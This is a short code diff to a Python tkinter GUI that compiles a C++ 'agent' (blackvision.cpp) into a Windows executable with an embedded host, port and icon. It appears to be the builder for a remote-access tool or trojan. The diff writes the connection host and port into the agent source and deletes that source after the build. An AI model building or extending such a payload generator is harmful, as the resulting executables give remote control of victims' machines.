@@ -1,5 +1,5 @@
 from server.core import *
-
+from server.changehostnPort import *
 try:
     import tkinter
 except ImportError:
@@ -32,8 +32,14 @@ class GUI:
 
 
         def generate(host, port, lfilename):
+            
+            if(hostport(host, port) == True):
+                print("Host and port changed.")
+            else:
+                print("Error changing host and port.")
 
             filename = lfilename+".exe"
+            
             if(os.name == "nt"):
                 if(exeCheck("g++") == True):
                     print("[+] Generating Executable..")
@@ -51,6 +57,7 @@ class GUI:
                     cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
                     os.system(cmd)
                     print("[+] File Compiled..")
+                    os.remove("agent/blackvision.cpp")
                     showInfo("Build succeeded!")
 
                 else:
@@ -78,7 +85,7 @@ class GUI:
             host = self.host.get()
             port = self.port.get()
             iconpath = self.path.get()
-            
+        
             rc_generate(filename, iconpath)
             generate(host, port, filename)
 
